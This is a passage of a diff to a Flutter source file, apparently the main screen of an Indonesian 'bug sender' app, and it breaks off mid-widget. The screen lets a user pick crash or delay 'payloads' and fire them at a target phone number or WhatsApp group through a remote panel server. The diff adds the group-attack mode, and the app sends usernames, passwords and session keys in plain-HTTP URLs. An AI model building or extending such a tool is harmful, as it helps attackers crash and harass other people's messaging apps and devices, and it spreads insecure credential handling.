@@ -1,918 +1,398 @@
 import 'dart:convert';
 import 'dart:ui';
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
 import 'package:http/http.dart' as http;
 import 'package:video_player/video_player.dart';
 
 class HomePage extends StatefulWidget {
-  final bool isGroup;
   final String username;
   final String password;
-  final String role;
-  final String expiredDate;
   final String sessionKey;
   final List<Map<String, dynamic>> listBug;
+  final String role;
+  final String expiredDate;
 
   const HomePage({
     super.key,
-    required this.isGroup,
     required this.username,
     required this.password,
-    required this.role,
-    required this.expiredDate,
     required this.sessionKey,
     required this.listBug,
+    required this.role,
+    required this.expiredDate,
   });
 
   @override
   State<HomePage> createState() => _HomePageState();
 }
 
-class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
-  late VideoPlayerController _videoController;
+class _HomePageState extends State<HomePage> {
   final targetController = TextEditingController();
-
-  late AnimationController _slideController;
-  late AnimationController _pulseController;
-  late AnimationController _progressController;
-
-  late Animation<Offset> _slideAnimation;
-  late Animation<double> _progressAnimation;
-
-  String selectedBugId      = "";
-  bool   _isSending         = false;
-  bool   _isVideoInitialized = false;
-
-  int    _currentStep = 0;
-  double _progress    = 0.0;
-
-  // ── Blue palette ────────────────────────────────────
-  static const Color bgDark     = Color(0xFF03080f);
-  static const Color deepBlue   = Color(0xFF060d18);
-  static const Color cardBlue   = Color(0xFF091525);
-  static const Color cardDark   = Color(0xFF0c1420);
-  static const Color mainBlue   = Color(0xFF1565c0);
-  static const Color accentCyan = Color(0xFF00b0ff);
-
-  final List<String> _progressSteps = const [
-    "Initializing...",
-    "Connecting to server...",
-    "Validating session...",
-    "Preparing payload...",
-    "Sending bug...",
-    "Success!",
+  final groupLinkController = TextEditingController();
+  
+  // ===== HANYA 3 BUG UNTUK GROUP =====
+  final List<Map<String, dynamic>> groupBugs = [
+    { 'bug_id': 'crash_spam', 'bug_name': 'DELAY INVISIBLE' },
+    { 'bug_id': 'invisible', 'bug_name': 'CRASH MSG' },
+    { 'bug_id': 'ios_invis', 'bug_name': 'FC ONE MSG' },
   ];
+  
+  String selectedBugId = "";
+  String bugMode = "contact";
+
+  bool _isSending = false;
+  String? _responseMessage;
+  bool _isRefreshing = false;
+
+  late VideoPlayerController _videoController;
+  bool _isVideoInitialized = false;
+
+  String displayUsername = "";
+  String displayRole = "";
+  String displayExp = "";
 
   @override
   void initState() {
     super.initState();
+    
+    displayUsername = widget.username;
+    displayRole = widget.role;
+    displayExp = widget.expiredDate;
+    
+    _refreshUserInfo();
 
-    _videoController =
-        VideoPlayerController.asset("assets/videos/landing.mp4")
-          ..initialize().then((_) {
-            if (mounted) setState(() => _isVideoInitialized = true);
-            _videoController
-              ..setLooping(true)
-              ..setVolume(0)
-              ..play();
-          });
-
-    _slideController = AnimationController(
-      vsync: this,
-      duration: const Duration(milliseconds: 700),
-    )..forward();
-
-    _slideAnimation = Tween<Offset>(
-      begin: const Offset(0, 0.25),
-      end: Offset.zero,
-    ).animate(CurvedAnimation(
-      parent: _slideController,
-      curve: Curves.easeOutCubic,
-    ));
-
-    _pulseController = AnimationController(
-      vsync: this,
-      duration: const Duration(milliseconds: 1400),
-    )..repeat(reverse: true);
-
-    _progressController = AnimationController(
-      vsync: this,
-      duration: const Duration(milliseconds: 700),
-    );
-    _progressAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
-      CurvedAnimation(parent: _progressController, curve: Curves.easeInOut),
-    );
-
+    // Set default bug berdasarkan mode
     if (widget.listBug.isNotEmpty) {
-      selectedBugId = widget.listBug[0]['bug_id'] as String;
+      selectedBugId = widget.listBug[0]['bug_id'];
+    }
+
+    _initializeVideoPlayer();
+  }
+
+  void _initializeVideoPlayer() {
+    _videoController = VideoPlayerController.asset(
+      'assets/videos/banner.mp4',
+    );
+
+    _videoController.initialize().then((_) {
+      setState(() {
+        _videoController.setVolume(0);
+        _videoController.setLooping(true);
+        _videoController.play();
+        _isVideoInitialized = true;
+      });
+    }).catchError((error) {
+      print("Video initialization error: $error");
+      setState(() {
+        _isVideoInitialized = false;
+      });
+    });
+  }
+
+  Future<void> _refreshUserInfo() async {
+    if (_isRefreshing) return;
+    
+    setState(() {
+      _isRefreshing = true;
+    });
+    
+    try {
+      final response = await http.get(
+        Uri.parse(
+          "http://panelbyxiaonotdev.zarxsft.my.id:2033/myInfo?"
+          "key=${widget.sessionKey}&"
+          "username=${widget.username}&"
+          "password=${widget.password}&"
+          "androidId=flutter_app"
+        ),
+      ).timeout(
+        const Duration(seconds: 10),
+        onTimeout: () {
+          throw Exception('Timeout');
+        },
+      );
+      
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+        
+        if (data['valid'] == true) {
+          setState(() {
+            displayUsername = data['username'] ?? widget.username;
+            displayRole = data['role'] ?? widget.role;
+            displayExp = data['expiredDate'] ?? widget.expiredDate;
+          });
+        }
+      }
+    } catch (e) {
+      print('❌ Error refreshing user info: $e');
+    } finally {
+      setState(() {
+        _isRefreshing = false;
+      });
     }
   }
 
   @override
   void dispose() {
-    _videoController.dispose();
-    _slideController.dispose();
-    _pulseController.dispose();
-    _progressController.dispose();
     targetController.dispose();
+    groupLinkController.dispose();
+    _videoController.dispose();
     super.dispose();
   }
 
-  Future<void> _updateProgress(int step) async {
-    if (!mounted) return;
-    setState(() {
-      _currentStep = step;
-      _progress    = (step + 1) / _progressSteps.length;
-    });
-    _progressController
-      ..reset()
-      ..forward();
-    await Future.delayed(const Duration(milliseconds: 550));
+  String? formatPhoneNumber(String input) {
+    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
+    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
+    return cleaned;
   }
 
-  Future<void> _sendBugNomor() async {
-    final target = targetController.text.trim();
-    if (target.isEmpty) {
-      _showPopup("Error", "Nomor target tidak boleh kosong!", isError: true);
+  Future<void> _sendBug() async {
+    if (bugMode == "contact") {
+      await _sendContactBug();
+    } else {
+      await _sendGroupBug();
+    }
+  }
+
+  Future<void> _sendContactBug() async {
+    final rawInput = targetController.text.trim();
+    final target = formatPhoneNumber(rawInput);
+    final key = widget.sessionKey;
+
+    if (target == null || key.isEmpty) {
+      _showAlert("❌ Invalid Number",
+          "Gunakan nomor internasional (misal: +62, +1, +44), bukan 08xxx.");
       return;
     }
-    setState(() { _isSending = true; _currentStep = 0; _progress = 0.0; });
+
+    setState(() {
+      _isSending = true;
+      _responseMessage = null;
+    });
+
     try {
-      for (int i = 0; i < 4; i++) await _updateProgress(i);
-      final url =
-          "http://saitama.omdhancivok.my.id:2001/sendBug"
-          "?key=${widget.sessionKey}&target=$target&bug=$selectedBugId";
-      await _updateProgress(4);
-      final res  = await http.get(Uri.parse(url));
-      final data = jsonDecode(res.body) as Map<String, dynamic>;
-      bool   ok  = false;
-      String msg = "";
+      final res = await http.get(Uri.parse(
+          "http://panelbyxiaonotdev.zarxsft.my.id:2033/sendBug?key=$key&target=$target&bug=$selectedBugId"));
+      final data = jsonDecode(res.body);
+
       if (data["cooldown"] == true) {
-        msg = "Cooldown: Tunggu ${data['wait']} detik.";
+        setState(() => _responseMessage = "⏳ Cooldown: Tunggu ${data["wait"]} detik.");
       } else if (data["valid"] == false) {
-        msg = "Sesi Invalid.";
+        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
       } else if (data["sended"] == false) {
-        msg = "Gagal: Server Maintenance.";
-      } else {
-        ok  = true;
-        msg = "Bug berhasil dikirim!";
-        await _updateProgress(5);
+        setState(() => _responseMessage = "⚠️ Gagal: Server sedang maintenance.");
+      } else if (data["sended"] == true) {
+        setState(() {
+          _responseMessage = "✅ Berhasil mengirim bug ke $target!";
+        });
+        targetController.clear();
+        
+        Future.delayed(const Duration(seconds: 2), () {
+          _refreshUserInfo();
+        });
       }
-      await Future.delayed(const Duration(milliseconds: 400));
-      if (ok) { _showPopup("Success", msg); targetController.clear(); }
-      else    { _showPopup("Failed",  msg, isError: true); }
-    } catch (_) {
-      _showPopup("Connection Error", "Gagal menghubungi server.", isError: true);
+    } catch (e) {
+      setState(() => _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
     } finally {
-      if (mounted) {
-        setState(() { _isSending = false; _currentStep = 0; _progress = 0.0; });
-      }
+      setState(() {
+        _isSending = false;
+      });
     }
   }
 
-  void _showPopup(String title, String message, {bool isError = false}) {
+  Future<void> _sendGroupBug() async {
+    final groupLink = groupLinkController.text.trim();
+    
+    if (groupLink.isEmpty || !groupLink.contains('chat.whatsapp.com')) {
+      _showAlert("❌ Invalid Link", "Masukkan link grup WhatsApp yang valid.");
+      return;
+    }
+
+    setState(() {
+      _isSending = true;
+      _responseMessage = null;
+    });
+
+    try {
+      final response = await http.get(
+        Uri.parse(
+          "http://panelbyxiaonotdev.zarxsft.my.id:2033/sendGroupBug?"
+          "key=${widget.sessionKey}&link=$groupLink&bug=$selectedBugId"
+        ),
+      ).timeout(
+        const Duration(seconds: 15),
+      );
+
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+        
+        if (data["cooldown"] == true) {
+          setState(() => _responseMessage = "⏳ Cooldown: Tunggu ${data["wait"]} detik.");
+        } else if (data['valid'] == true && data['sended'] == true) {
+          setState(() {
+            _responseMessage = "✅ Bug berhasil dikirim ke grup!";
+          });
+          groupLinkController.clear();
+          
+          Future.delayed(const Duration(seconds: 2), () {
+            _refreshUserInfo();
+          });
+        } else {
+          setState(() => _responseMessage = data['message'] ?? "⚠️ Gagal mengirim bug ke grup.");
+        }
+      } else {
+        setState(() => _responseMessage = "❌ Error: Server error ${response.statusCode}");
+      }
+    } catch (e) {
+      setState(() => _responseMessage = "❌ Error: Gagal mengirim bug. Cek koneksi Anda.");
+    } finally {
+      setState(() {
+        _isSending = false;
+      });
+    }
+  }
+
+  void _showAlert(String title, String msg) {
     showDialog(
       context: context,
       builder: (_) => BackdropFilter(
-        filter: ImageFilter.blur(sigmaX: 14, sigmaY: 14),
+        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
         child: AlertDialog(
-          backgroundColor: cardBlue,
+          backgroundColor: const Color(0xFF1A1A1A),
           shape: RoundedRectangleBorder(
             borderRadius: BorderRadius.circular(20),
-            side: BorderSide(
-              color: isError ? Colors.redAccent : accentCyan,
+          ),
+          title: Text(
+            title,
+            style: const TextStyle(
+              fontWeight: FontWeight.bold,
+              fontSize: 18,
+              color: Colors.white,
+            ),
+          ),
+          content: Text(
+            msg,
+            style: const TextStyle(
+              color: Colors.white70,
+              fontSize: 14,
+            ),
+          ),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.pop(context),
+              child: const Text(
+                "OK",
+                style: TextStyle(
+                  color: Colors.white70,
+                  fontWeight: FontWeight.bold,
+                ),
+              ),
+            ),
+          ],
+        ),
+      ),
+    );
+  }
+
+  Widget _buildGlassCard({required Widget child}) {
+    return ClipRRect(
+      borderRadius: BorderRadius.circular(24),
+      child: BackdropFilter(
+        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+        child: Container(
+          margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 16),
+          padding: const EdgeInsets.all(24),
+          decoration: BoxDecoration(
+            color: Colors.white.withOpacity(0.05),
+            borderRadius: BorderRadius.circular(24),
+            border: Border.all(
+              color: Colors.white.withOpacity(0.1),
               width: 1.5,
             ),
           ),
-          title: Row(
-            children: [
-              Container(
-                padding: const EdgeInsets.all(8),
-                decoration: BoxDecoration(
-                  color: (isError ? Colors.redAccent : accentCyan)
-                      .withOpacity(0.15),
-                  shape: BoxShape.circle,
-                ),
-                child: Icon(
-                  isError ? Icons.error_outline : Icons.check_circle_outline,
-                  color: isError ? Colors.redAccent : accentCyan,
-                  size: 22,
-                ),
-              ),
-              const SizedBox(width: 12),
-              Expanded(
-                child: Text(
-                  title,
-                  style: const TextStyle(
-                    color: Colors.white,
-                    fontWeight: FontWeight.bold,
-                  ),
-                ),
-              ),
-            ],
-          ),
-          content: Text(
-            message,
-            style: const TextStyle(color: Colors.white70, fontSize: 14),
-          ),
-          actions: [
-            Container(
-              decoration: BoxDecoration(
-                gradient: LinearGradient(
-                  colors: isError
-                      ? [Colors.redAccent, Colors.red]
-                      : [mainBlue, accentCyan],
-                ),
-                borderRadius: BorderRadius.circular(10),
-              ),
-              child: TextButton(
-                onPressed: () => Navigator.pop(context),
-                child: const Text(
-                  "OK",
-                  style: TextStyle(
-                      color: Colors.white, fontWeight: FontWeight.bold),
-                ),
-              ),
-            ),
-          ],
+          child: child,
         ),
       ),
     );
   }
 
-  // ════════════════════════════════════════════════════
-  //  BUILD
-  // ════════════════════════════════════════════════════
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      backgroundColor: bgDark,
-      body: Stack(
-        children: [
-          // Gradient background
-          Container(
-            decoration: const BoxDecoration(
-              gradient: LinearGradient(
-                colors: [bgDark, deepBlue],
-                begin: Alignment.topCenter,
-                end: Alignment.bottomCenter,
-              ),
-            ),
-          ),
-
-          // Dot grid overlay
-          Opacity(
-            opacity: 0.045,
-            child: CustomPaint(
-              painter: _DotGridPainter(),
-              size: Size.infinite,
-            ),
-          ),
-
-          SafeArea(
-            child: SlideTransition(
-              position: _slideAnimation,
-              child: SingleChildScrollView(
-                padding:
-                    const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
-                child: Column(
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  children: [
-                    _buildProfileCard(),
-                    const SizedBox(height: 16),
-
-                    _buildVideoBanner(),
-                    const SizedBox(height: 20),
-
-                    _buildTargetSection(),
-                    const SizedBox(height: 20),
-
-                    _buildSectionLabel(),
-                    const SizedBox(height: 12),
-
-                    _buildBugCards(),
-                    const SizedBox(height: 24),
-
-                    if (_isSending) ...[
-                      _buildProgressBar(),
-                      const SizedBox(height: 20),
-                    ],
-
-                    _buildSendButton(),
-                    const SizedBox(height: 30),
-                  ],
-                ),
-              ),
-            ),
-          ),
-        ],
-      ),
-    );
-  }
-
-  // ════════════════════════════════════════════════════
-  //  PROFILE CARD
-  // ════════════════════════════════════════════════════
-  Widget _buildProfileCard() {
+  Widget _buildProfileSection() {
     return Container(
-      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
-      decoration: BoxDecoration(
-        color: cardDark,
+      margin: const EdgeInsets.fromLTRB(16, 10, 16, 8),
+      child: ClipRRect(
         borderRadius: BorderRadius.circular(20),
-        border: Border.all(color: accentCyan.withOpacity(0.16), width: 1),
-        boxShadow: [
-          BoxShadow(
-            color: Colors.black.withOpacity(0.4),
-            blurRadius: 14,
-            offset: const Offset(0, 4),
-          ),
-        ],
-      ),
-      child: Row(
-        children: [
-          // Avatar with glowing cyan ring
-          Container(
-            width: 64,
-            height: 64,
-            padding: const EdgeInsets.all(2.5),
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+          child: Container(
+            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
             decoration: BoxDecoration(
-              shape: BoxShape.circle,
-              gradient: const LinearGradient(
-                colors: [accentCyan, mainBlue],
-                begin: Alignment.topLeft,
-                end: Alignment.bottomRight,
-              ),
-              boxShadow: [
-                BoxShadow(
-                  color: accentCyan.withOpacity(0.38),
-                  blurRadius: 14,
-                  spreadRadius: 1,
-                ),
-              ],
-            ),
-            child: ClipOval(
-              child: Image.asset(
-                'assets/images/icon.jpg',
-                fit: BoxFit.cover,
-                errorBuilder: (_, __, ___) => Container(
-                  color: deepBlue,
-                  child: const Icon(
-                    Icons.person_rounded,
-                    color: accentCyan,
-                    size: 32,
-                  ),
-                ),
+              color: Colors.white.withOpacity(0.05),
+              borderRadius: BorderRadius.circular(20),
+              border: Border.all(
+                color: Colors.white.withOpacity(0.1),
+                width: 1.5,
               ),
             ),
-          ),
-          const SizedBox(width: 14),
-
-          Expanded(
-            child: Column(
-              crossAxisAlignment: CrossAxisAlignment.start,
+            child: Row(
               children: [
-                Text(
-                  widget.username,
-                  style: const TextStyle(
-                    color: Colors.white,
-                    fontSize: 20,
-                    fontWeight: FontWeight.bold,
-                    letterSpacing: 0.2,
+                Container(
+                  width: 60,
+                  height: 60,
+                  decoration: BoxDecoration(
+                    shape: BoxShape.circle,
+                    border: Border.all(
+                      color: Colors.white.withOpacity(0.3),
+                      width: 2,
+                    ),
+                    image: const DecorationImage(
+                      image: AssetImage('assets/images/logo.jpg'),
+                      fit: BoxFit.cover,
+                    ),
                   ),
                 ),
-                const SizedBox(height: 8),
-                Row(
-                  children: [
-                    // Role pill — grey outline like reference
-                    Container(
-                      padding: const EdgeInsets.symmetric(
-                          horizontal: 12, vertical: 4),
-                      decoration: BoxDecoration(
-                        color: Colors.white.withOpacity(0.07),
-                        borderRadius: BorderRadius.circular(20),
-                        border: Border.all(
-                          color: Colors.white.withOpacity(0.16),
-                          width: 1,
-                        ),
-                      ),
-                      child: Text(
-                        widget.role.toUpperCase(),
+                const SizedBox(width: 16),
+                Expanded(
+                  child: Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    mainAxisSize: MainAxisSize.min,
+                    children: [
+                      Text(
+                        displayUsername,
                         style: const TextStyle(
-                          color: Colors.white60,
-                          fontSize: 10,
+                          color: Colors.white,
+                          fontSize: 18,
                           fontWeight: FontWeight.bold,
-                          letterSpacing: 1.5,
+                          letterSpacing: 0.5,
+                        ),
+                        overflow: TextOverflow.ellipsis,
+                      ),
+                      const SizedBox(height: 4),
+                      Text(
+                        displayRole.toUpperCase(),
+                        style: const TextStyle(
+                          color: Color(0xFFD4AF37),
+                          fontSize: 12,
+                          fontWeight: FontWeight.w600,
+                          letterSpacing: 0.8,
                         ),
                       ),
-                    ),
-                    const SizedBox(width: 10),
-                    Text(
-                      "Exp: ${widget.expiredDate}",
-                      style: TextStyle(
-                        color: Colors.grey.shade500,
-                        fontSize: 12,
-                      ),
-                    ),
-                  ],
+                    ],
+                  ),
                 ),
-              ],
-            ),
-          ),
-        ],
-      ),
-    );
-  }
-
-  // ════════════════════════════════════════════════════
-  //  VIDEO BANNER
-  // ════════════════════════════════════════════════════
-  Widget _buildVideoBanner() {
-    return ClipRRect(
-      borderRadius: BorderRadius.circular(20),
-      child: SizedBox(
-        width: double.infinity,
-        height: 210,
-        child: Stack(
-          fit: StackFit.expand,
-          children: [
-            if (_isVideoInitialized)
-              FittedBox(
-                fit: BoxFit.cover,
-                child: SizedBox(
-                  width: _videoController.value.size.width,
-                  height: _videoController.value.size.height,
-                  child: VideoPlayer(_videoController),
-                ),
-              )
-            else
-              Container(
-                color: cardDark,
-                child: const Center(
-                  child: CircularProgressIndicator(
-                      color: accentCyan, strokeWidth: 2),
-                ),
-              ),
-
-            // Vignette
-            Container(
-              decoration: BoxDecoration(
-                gradient: LinearGradient(
-                  colors: [
-                    Colors.black.withOpacity(0.1),
-                    Colors.transparent,
-                    Colors.black.withOpacity(0.5),
-                  ],
-                  begin: Alignment.topCenter,
-                  end: Alignment.bottomCenter,
-                ),
-              ),
-            ),
-
-            // Cyan border frame
-            Container(
-              decoration: BoxDecoration(
-                borderRadius: BorderRadius.circular(20),
-                border: Border.all(
-                  color: accentCyan.withOpacity(0.22),
-                  width: 1.2,
-                ),
-              ),
-            ),
-          ],
-        ),
-      ),
-    );
-  }
-
-  // ════════════════════════════════════════════════════
-  //  TARGET NUMBER SECTION
-  // ════════════════════════════════════════════════════
-  Widget _buildTargetSection() {
-    return Container(
-      decoration: BoxDecoration(
-        color: cardDark,
-        borderRadius: BorderRadius.circular(18),
-        border: Border.all(color: Colors.white.withOpacity(0.07), width: 1),
-        boxShadow: [
-          BoxShadow(
-            color: Colors.black.withOpacity(0.45),
-            blurRadius: 14,
-            offset: const Offset(0, 4),
-          ),
-        ],
-      ),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
-        children: [
-          // ── Header ───────────────────────────────
-          Padding(
-            padding: const EdgeInsets.fromLTRB(16, 14, 16, 10),
-            child: Row(
-              children: [
                 Container(
-                  padding: const EdgeInsets.all(7),
+                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                   decoration: BoxDecoration(
-                    color: accentCyan.withOpacity(0.1),
-                    borderRadius: BorderRadius.circular(8),
+                    color: Colors.white.withOpacity(0.1),
+                    borderRadius: BorderRadius.circular(12),
                     border: Border.all(
-                        color: accentCyan.withOpacity(0.3), width: 1),
-                  ),
-                  child: const Icon(Icons.gps_fixed_rounded,
-                      color: accentCyan, size: 16),
-                ),
-                const SizedBox(width: 10),
-                const Text(
-                  'TARGET NUMBER',
-                  style: TextStyle(
-                    color: Colors.white,
-                    fontWeight: FontWeight.bold,
-                    fontSize: 13,
-                    letterSpacing: 1.2,
-                  ),
-                ),
-                const Spacer(),
-                Container(
-                  padding: const EdgeInsets.symmetric(
-                      horizontal: 10, vertical: 4),
-                  decoration: BoxDecoration(
-                    color: Colors.white.withOpacity(0.05),
-                    borderRadius: BorderRadius.circular(20),
-                    border: Border.all(
-                        color: Colors.white.withOpacity(0.1), width: 1),
-                  ),
-                  child: const Text(
-                    'INTERNATIONAL',
-                    style: TextStyle(
-                      color: Colors.white54,
-                      fontSize: 9,
-                      fontWeight: FontWeight.bold,
-                      letterSpacing: 1,
+                      color: Colors.white.withOpacity(0.2),
+                      width: 1,
                     ),
-                  ),
-                ),
-              ],
-            ),
-          ),
-
-          // ── Input field ──────────────────────────
-          Padding(
-            padding: const EdgeInsets.fromLTRB(14, 0, 14, 6),
-            child: Container(
-              height: 52,
-              decoration: BoxDecoration(
-                color: deepBlue,
-                borderRadius: BorderRadius.circular(14),
-                border: Border.all(
-                    color: accentCyan.withOpacity(0.18), width: 1),
-              ),
-              child: TextField(
-                controller: targetController,
-                style: const TextStyle(
-                    color: Colors.white,
-                    fontSize: 15,
-                    fontWeight: FontWeight.w500),
-                cursorColor: accentCyan,
-                keyboardType: TextInputType.phone,
-                decoration: InputDecoration(
-                  hintText: '628123456789',
-                  hintStyle: TextStyle(
-                      color: Colors.grey.shade600, fontSize: 15),
-                  border: InputBorder.none,
-                  contentPadding: const EdgeInsets.symmetric(
-                      horizontal: 16, vertical: 16),
-                  prefixIcon: Padding(
-                    padding: const EdgeInsets.only(left: 14, right: 10),
-                    child: Icon(Icons.phone_android_rounded,
-                        color: accentCyan.withOpacity(0.7), size: 20),
-                  ),
-                  prefixIconConstraints:
-                      const BoxConstraints(minWidth: 0, minHeight: 0),
-                  suffixIcon: IconButton(
-                    icon: Icon(Icons.clear_rounded,
-                        color: Colors.grey.shade700, size: 18),
-                    onPressed: () => targetController.clear(),
-                  ),
-                ),
-              ),
-            ),
-          ),
-
-          // ── Format hint ──────────────────────────
-          Padding(
-            padding: const EdgeInsets.fromLTRB(16, 2, 16, 14),
-            child: Row(
-              children: [
-                Icon(Icons.info_outline_rounded,
-                    color: Colors.grey.shade600, size: 12),
-                const SizedBox(width: 5),
-                Text(
-                  'Format: Country code + number (without + or 0)',
-                  style: TextStyle(
-                      color: Colors.grey.shade600, fontSize: 11),
-                ),
-              ],
-            ),
-          ),
-        ],
-      ),
-    );
-  }
-
-  // ════════════════════════════════════════════════════
-  //  SECTION LABEL  "PILIH BUG"
-  // ════════════════════════════════════════════════════
-  Widget _buildSectionLabel() {
-    return Row(
-      children: [
-        Container(
-          width: 3.5,
-          height: 18,
-          decoration: BoxDecoration(
-            color: accentCyan,
-            borderRadius: BorderRadius.circular(2),
-            boxShadow: [
-              BoxShadow(
-                color: accentCyan.withOpacity(0.55),
-                blurRadius: 8,
-              ),
-            ],
-          ),
-        ),
-        const SizedBox(width: 10),
-        const Text(
-          "PILIH BUG",
-          style: TextStyle(
-            color: Colors.white,
-            fontWeight: FontWeight.bold,
-            fontSize: 13,
-            letterSpacing: 2.5,
-          ),
-        ),
-      ],
-    );
-  }
-
-  // ════════════════════════════════════════════════════
-  //  SELECT PAYLOAD  (card container — sesuai foto)
-  // ════════════════════════════════════════════════════
-  Widget _buildBugCards() {
-    return Container(
-      decoration: BoxDecoration(
-        color: cardDark,
-        borderRadius: BorderRadius.circular(18),
-        border: Border.all(color: Colors.white.withOpacity(0.07), width: 1),
-        boxShadow: [
-          BoxShadow(
-            color: Colors.black.withOpacity(0.45),
-            blurRadius: 14,
-            offset: const Offset(0, 4),
-          ),
-        ],
-      ),
-      child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
-        children: [
-          // ── Header row ──────────────────────────
-          Padding(
-            padding: const EdgeInsets.fromLTRB(16, 14, 14, 10),
-            child: Row(
-              children: [
-                Container(
-                  padding: const EdgeInsets.all(7),
-                  decoration: BoxDecoration(
-                    color: accentCyan.withOpacity(0.1),
-                    borderRadius: BorderRadius.circular(8),
-                    border: Border.all(
-                        color: accentCyan.withOpacity(0.25), width: 1),
-                  ),
-                  child: const Icon(Icons.grid_view_rounded,
-                      color: accentCyan, size: 16),
-                ),
-                const SizedBox(width: 10),
-                const Text(
-                  'SELECT PAYLOAD',
-                  style: TextStyle(
-                    color: Colors.white,
-                    fontWeight: FontWeight.bold,
-                    fontSize: 13,
-                    letterSpacing: 1.2,
-                  ),
-                ),
-                const Spacer(),
-                // Badge jumlah selected
-                Container(
-                  padding: const EdgeInsets.symmetric(
-                      horizontal: 10, vertical: 4),
-                  decoration: BoxDecoration(
-                    color: selectedBugId.isNotEmpty
-                        ? const Color(0xFF16a34a)
-                        : Colors.white.withOpacity(0.06),
-                    borderRadius: BorderRadius.circular(20),
                   ),
                   child: Text(
-                    selectedBugId.isNotEmpty ? '1 SELECTED' : '0 SELECTED',
+                    "Exp: $displayExp",
                     style: const TextStyle(
                       color: Colors.white,
-                      fontSize: 10,
-                      fontWeight: FontWeight.bold,
-                      letterSpacing: 0.8,
-                    ),
-                  ),
-                ),
-              ],
-            ),
-          ),
-
-          // ── Horizontal card list ─────────────────
-          if (widget.listBug.isEmpty)
-            Padding(
-              padding: const EdgeInsets.fromLTRB(16, 4, 16, 16),
-              child: Container(
-                height: 120,
-                decoration: BoxDecoration(
-                  color: deepBlue,
-                  borderRadius: BorderRadius.circular(12),
-                  border: Border.all(color: accentCyan.withOpacity(0.12)),
-                ),
-                child: Center(
-                  child: Text(
-                    'No payload available',
-                    style: TextStyle(color: Colors.grey.shade600),
-                  ),
-                ),
-              ),
-            )
-          else
-            SizedBox(
-              height: 148,
-              child: ListView.separated(
-                scrollDirection: Axis.horizontal,
-                padding: const EdgeInsets.fromLTRB(14, 0, 14, 4),
-                itemCount: widget.listBug.length,
-                separatorBuilder: (_, __) => const SizedBox(width: 10),
-                itemBuilder: (context, index) {
-                  final bug        = widget.listBug[index];
-                  final bugId      = bug['bug_id'] as String;
-                  final bugName    = bug['bug_name'] as String;
-                  final isSelected = selectedBugId == bugId;
-
-                  return GestureDetector(
-                    onTap: () {
-                      HapticFeedback.selectionClick();
-                      setState(() => selectedBugId = bugId);
-                    },
-                    child: AnimatedContainer(
-                      duration: const Duration(milliseconds: 200),
-                      width: 118,
-                      decoration: BoxDecoration(
-                        color: isSelected
-                            ? const Color(0xFF0f2a4a)
-                            : const Color(0xFF0a1525),
-                        borderRadius: BorderRadius.circular(14),
-                        border: Border.all(
-                          color: isSelected
-                              ? accentCyan.withOpacity(0.6)
-                              : Colors.white.withOpacity(0.07),
-                          width: isSelected ? 1.5 : 1,
-                        ),
-                        boxShadow: isSelected
-                            ? [
-                                BoxShadow(
-                                  color: accentCyan.withOpacity(0.2),
-                                  blurRadius: 14,
-                                  spreadRadius: 1,
-                                ),
-                              ]
-                            : [
-                                BoxShadow(
-                                  color: Colors.black.withOpacity(0.4),
-                                  blurRadius: 6,
-                                  offset: const Offset(0, 2),
-                                ),
-                              ],
-                      ),
-                      child: Stack(
-                        children: [
-                          // ── Card content ──────────
-                          Padding(
-                            padding: const EdgeInsets.symmetric(
-                                horizontal: 10, vertical: 12),
-                            child: Column(
-                              crossAxisAlignment: CrossAxisAlignment.start,
-                              children: [
-                                // Bug icon circle
-                                Container(
-                                  width: 44,
-                                  height: 44,
-                                  decoration: BoxDecoration(
-                                    color: isSelected
-                                        ? accentCyan.withOpacity(0.12)
-                                        : Colors.white.withOpacity(0.05),
-                                    shape: BoxShape.circle,
-                                    border: Border.all(
-                                      color: isSelected
-                                          ? accentCyan.withOpacity(0.4)
-                                          : Colors.white.withOpacity(0.08),
-                                      width: 1,
-                                    ),
-                                  ),
-                                  child: Icon(
-                                    Icons.bug_report_rounded,
-                                    color: isSelected
-                                        ? accentCyan
-                                        : Colors.grey.shade500,
-                                    size: 22,
-                                  ),
-                                ),
-                                const SizedBox(height: 10),
-
-                                // Bug name
-                                Text(
-                                  bugName,
-                                  maxLines: 2,
-                                  overflow: TextOverflow.ellipsis,
-                                  style: TextStyle(
-                                    color: isSelected
-                                        ? Colors.white
-                                        : Colors.grey.shade400,
-                                    fontSize: 12,
-                                    fontWeight: FontWeight.w700,
-                                    height: 1.3,
-                                  ),
-                                ),
-                                const SizedBox(height: 5),
-
-                                // Sub-label "Payload"
-                                Text(
-                                  'Payload',
-                                  style: TextStyle(
-                                    color: isSelected
-                                        ? accentCyan.withOpacity(0.7)
-                                        : Colors.grey.shade600,
-                                    fontSize: 10,
-                                  ),
-                                ),
-                              ],
-                            ),
-                          ),
-
-                          // ── Checkmark badge (selected) ──
-                          if (isSelected)
-                            Positioned(
-                              top: 8,
-                              right: 8,
-                              child: Container(
-                                width: 20,
-                                height: 20,
-                                decoration: const BoxDecoration(
-                                  color: Color(0xFF16a34a),
-                                  shape: BoxShape.circle,
-                                ),
-                                child: const Icon(
-                                  Icons.check_rounded,
-                                  color: Colors.white,
-                                  size: 13,
-                                ),
-                              ),
-                            ),
-                        ],
-                      ),
-                    ),
-                  );
-                },
-              ),
-            ),
-
-          // ── Footer: count + Clear ────────────────
-          Padding(
